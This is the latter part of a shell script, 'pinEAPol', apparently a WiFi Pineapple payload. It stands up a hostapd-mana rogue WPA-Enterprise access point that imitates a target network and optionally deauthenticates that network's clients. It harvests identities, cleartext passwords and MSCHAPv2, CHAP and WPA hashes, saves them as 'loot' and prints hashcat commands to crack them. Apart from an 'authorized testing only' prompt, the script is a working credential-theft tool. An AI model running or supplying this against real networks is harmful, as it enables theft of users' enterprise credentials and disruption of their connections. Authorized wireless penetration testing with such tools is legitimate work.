                            negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
                            log_eap_failure_diagnostics "$failure_count" "$negotiation"
                            ;;
                        CONNECTED)
                            association_count=$((association_count + 1))
                            logboth green "Client authorized/connected (total: $association_count)"
                            if deauthorize_connected_station "$event_detail"; then
                                logboth yellow "Client immediately deauthorized; AP access remains disabled"
                            else
                                logboth red "Could not immediately deauthorize connected client; inspect hostapd log"
                            fi
                            ;;
                        DISCONNECTED)
                            disassociation_count=$((disassociation_count + 1))
                            logboth blue "Client disconnected (total: $disassociation_count)"
                            ;;
                    esac
                done < <(live_event_stream "$delta_file")
            fi
        fi

        # mana_credout can flush independently of hostapd stdout. Prefer the
        # ordered stdout event above, but do not lose a notification when that
        # counterpart is absent or arrives late.
        if [ "$pending_mschap_notice" -gt 0 ] && \
           [ $((loop_count - pending_mschap_since)) -ge 2 ]; then
            logboth yellow "Complete MSCHAPv2 response captured!"
            pending_mschap_notice=$((pending_mschap_notice - 1))
            [ "$pending_mschap_notice" -gt 0 ] || pending_mschap_since=0
            pending_no_material_success=0
            VIBRATE
            play_capture
        fi
        if [ "$pending_chap_notice" -gt 0 ] && \
           [ $((loop_count - pending_chap_since)) -ge 2 ]; then
            logboth yellow "Legacy MD5/CHAP response captured!"
            pending_chap_notice=$((pending_chap_notice - 1))
            [ "$pending_chap_notice" -gt 0 ] || pending_chap_since=0
            pending_no_material_success=0
            VIBRATE
            play_capture
        fi
        if [ "$pending_cleartext_notice" -gt 0 ] && \
           [ $((loop_count - pending_cleartext_since)) -ge 2 ]; then
            logboth green "CLEARTEXT PASSWORD CAPTURED!"
            pending_cleartext_notice=$((pending_cleartext_notice - 1))
            [ "$pending_cleartext_notice" -gt 0 ] || pending_cleartext_since=0
            pending_no_material_success=0
            VIBRATE
            VIBRATE
            play_capture
        fi

        if [ "$pending_no_material_success" -gt 0 ] && \
           [ $((loop_count - pending_no_material_success)) -ge 8 ]; then
            logboth yellow "No credential material observed after EAP success; raw session logs retained"
            pending_no_material_success=0
        fi

        # Status update every ~10 seconds
        if [ $((loop_count % 20)) -eq 0 ]; then
            local uptime=$((loop_count / 2))
            local status_negotiation
            status_negotiation=$(eap_negotiation_label "$observed_outer_method" "$observed_inner_method")
            LOG blue "--- Status [${uptime}s] ---"
            LOG blue "Profile: $EAP_PROFILE | EAP: $status_negotiation"
            LOG blue "Evidence: cleartext=$CLEARTEXT_COUNT  5500=$MSCHAPV2_COUNT  4800=$CHAP_COUNT  22000=$WPA2_HASH_COUNT"
            LOG blue "Identities: $IDENTITY_COUNT | TLS evidence: $TLS_EVIDENCE_COUNT | NAKs: $nak_count"
        fi

        # Check hostapd still running
        if [ -n "$HOSTAPD_PID" ] && ! kill -0 "$HOSTAPD_PID" 2>/dev/null; then
            logboth red "hostapd died unexpectedly!"
            led_error
            break
        fi

        sleep 0.5
    done
}

# ============================================
# PHASE 4: HARVEST
# ============================================

harvest_results() {
    LOG ""
    logboth yellow "=== HARVESTING ==="
    led_harvest

    # Stop only the hostapd-mana process whose PID, start time, executable
    # checksum, and generated configuration all match this payload.
    stop_managed_hostapd

    # Stop tcpdump and wait for libpcap to flush the capture before parsing.
    stop_capture

    remove_managed_interfaces

    # Final credential parse
    local sid=$(START_SPINNER "Parsing credentials...")
    parse_credentials "$HOSTAPD_LOG" "$SESSION_RESULTS_DIR"
    cleanup_stale_parse_staging "$SESSION_WORK_DIR"
    STOP_SPINNER $sid

    # Record duration
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    local dur_min=$((duration / 60))
    local dur_sec=$((duration % 60))
    echo "${dur_min}m ${dur_sec}s" > "$SESSION_DIR/duration.txt"

    # Display summary
    LOG ""
    LOG green "=========================================="
    LOG green "  pinEAPol CAPTURE COMPLETE"
    LOG green "=========================================="
    LOG ""
    LOG blue "Target:     $TARGET_SSID"
    LOG blue "Duration:   ${dur_min}m ${dur_sec}s"
    LOG ""
    LOG green "Identities:       $IDENTITY_COUNT"
    LOG green "Cleartext creds:  $CLEARTEXT_COUNT"
    LOG yellow "MSCHAPv2 hashes:  $MSCHAPV2_COUNT"
    LOG yellow "MD5/CHAP records: $CHAP_COUNT"
    LOG yellow "WPA hashes:        $WPA2_HASH_COUNT"
    LOG blue "TLS evidence lines: $TLS_EVIDENCE_COUNT"
    LOG ""
    LOG blue "Loot: $SESSION_DIR"

    if [ "$MSCHAPV2_COUNT" -gt 0 ]; then
        LOG ""
        LOG yellow "Crack MSCHAPv2 hashes:"
        LOG yellow "  hashcat -m 5500 results/hashcat_5500.txt wordlist.txt"
    fi

    if [ -s "$SESSION_RESULTS_DIR/hashcat_4800.txt" ]; then
        LOG yellow "Crack MD5/CHAP hashes:"
        LOG yellow "  hashcat -m 4800 results/hashcat_4800.txt wordlist.txt"
    fi

    if [ -s "$SESSION_RESULTS_DIR/hashcat_22000.txt" ]; then
        LOG yellow "Crack WPA hashes:"
        LOG yellow "  hashcat -m 22000 results/hashcat_22000.txt wordlist.txt"
    fi

    local total=$((IDENTITY_COUNT + CLEARTEXT_COUNT + MSCHAPV2_COUNT + CHAP_COUNT + WPA2_HASH_COUNT + TLS_EVIDENCE_COUNT))

    if [ "$total" -gt 0 ]; then
        VIBRATE
        sleep 0.3
        VIBRATE
        sleep 0.3
        VIBRATE
        play_complete
        ALERT "pinEAPol CAPTURE COMPLETE!

Identities: $IDENTITY_COUNT
Cleartext: $CLEARTEXT_COUNT
MSCHAPv2: $MSCHAPV2_COUNT
MD5/CHAP: $CHAP_COUNT
TLS evidence: $TLS_EVIDENCE_COUNT

Loot saved"
    else
        play_fail
        ALERT "pinEAPol CAPTURE COMPLETE

No credentials captured

Raw logs saved to:
$SESSION_DIR"
    fi
}

# ============================================
# MAIN EXECUTION
# ============================================

# Detached supervisor mode must run before the library-only fixture gate.
if [ "${1:-}" = "--cleanup-watchdog" ]; then
    trap - EXIT INT TERM HUP QUIT
    [ "$#" -eq 7 ] || exit 2
    shift
    cleanup_watchdog_main "$@"
    exit $?
fi

# Allows fixture tests to load parsers without launching the Pager UI.
if [ "${PINEAPOL_LIBRARY_ONLY:-0}" = "1" ]; then
    trap - EXIT INT TERM HUP QUIT
    return 0 2>/dev/null || exit 0
fi

LOG ""
LOG green  "       \\\\ | //"
LOG green  "        \\\\|//"
LOG yellow "       .-^-.-."
LOG yellow "      /       \\"
LOG yellow "     | pinEAPol |"
LOG yellow "      \\       /"
LOG yellow "       '-----'"
LOG ""
LOG red "  WPA-Enterprise EAP Capture"
LOG red "  v3.7"
LOG ""

# Confirm start
resp=$(CONFIRMATION_DIALOG "Start pinEAPol?

Deploys a hostapd-mana
WPA-Enterprise test AP

Authorized testing only!")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
        LOG "Cancelled"
        exit 0
        ;;
esac

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "User declined"
    exit 0
fi

# Create persistent storage and write directly into the final session tree.
initialize_persistent_storage || {
    ERROR_DIALOG "Could not initialize
$PINEAPOL_HOME"
    exit 1
}
read_persistent_settings

# ── PHASE 0: DEPS ──────────────────────────
LOG blue "=== PHASE 0: DEPENDENCIES ==="
check_deps || exit 1
recover_stale_runtime || {
    ERROR_DIALOG "Could not recover stale
pinEAPol runtime"
    exit 1
}

# ── PHASE 1: RECON ─────────────────────────
LOG ""
LOG blue "=== PHASE 1: RECON ==="
led_recon

if ! recon_target_menu; then
    LOG "Cancelled"
    exit 0
fi

if [ -n "$TARGET_BSSID" ]; then
    logboth green "Target: $TARGET_SSID"
    logboth blue "BSSID: $TARGET_BSSID"
    logboth blue "Channel: $TARGET_CHANNEL"
    logboth blue "Signal: ${TARGET_SIGNAL}dBm"
else
    logboth green "Target: $TARGET_SSID"
    logboth blue "Channel: $TARGET_CHANNEL"
    logboth blue "Source: manual entry"
fi

rename_session_for_target

# ── PHASE 2: SETUP ─────────────────────────
LOG ""
LOG blue "=== PHASE 2: SETUP ==="
led_setup

select_eap_profile || {
    LOG "EAP profile selection cancelled"
    exit 0
}
configure_certificate_runtime || {
    LOG "Certificate profile selection cancelled"
    exit 0
}
configure_deauth_runtime || {
    LOG "Deauthentication setup cancelled"
    exit 0
}
review_deployment || {
    LOG "Deployment cancelled"
    exit 0
}

{
    echo "target_ssid=$TARGET_SSID"
    echo "target_bssid=$TARGET_BSSID"
    echo "target_channel=$TARGET_CHANNEL"
    echo "eap_profile=$EAP_PROFILE"
    echo "certificate_profile=$CERT_PROFILE"
    echo "deauth_enabled=$DEAUTH_ENABLED"
    echo "deauth_packets=$DEAUTH_BURST_COUNT"
    echo "hostapd_backend=$HOSTAPD_BACKEND"
    echo "hostapd_binary=$HOSTAPD_BIN"
    echo "hostapd_mana_commit=$MANA_BUILD_ID"
    echo "hostapd_mana_sha256=$MANA_EXPECTED_SHA256"
    echo "mana_credout=$MANA_CREDOUT"
    echo "started_at=$(date '+%Y-%m-%dT%H:%M:%S%z')"
} > "$SESSION_CONFIG_DIR/session.conf"

generate_certs || {
    ERROR_DIALOG "Certificate generation
failed"
    exit 1
}

create_virtual_interface || {
    ERROR_DIALOG "Failed to create
virtual interface"
    exit 1
}

write_eap_user_file || {
    ERROR_DIALOG "EAP config failed"
    exit 1
}

write_hostapd_config "$TARGET_SSID" "$TARGET_CHANNEL" || {
    ERROR_DIALOG "hostapd config failed"
    exit 1
}

logboth green "Setup complete"

# ── PHASE 3: DEPLOY ────────────────────────
LOG ""
LOG blue "=== PHASE 3: DEPLOY ==="
led_deploy

start_hostapd || {
    ERROR_DIALOG "hostapd failed
Check logs at:
$HOSTAPD_LOG"
    exit 1
}

start_capture

deauth_target_clients

VIBRATE
live_monitor

# ── PHASE 4: HARVEST ───────────────────────
LOG ""
LOG blue "=== PHASE 4: HARVEST ==="

harvest_results

LOG ""
LOG green "pinEAPol complete"
exit 0
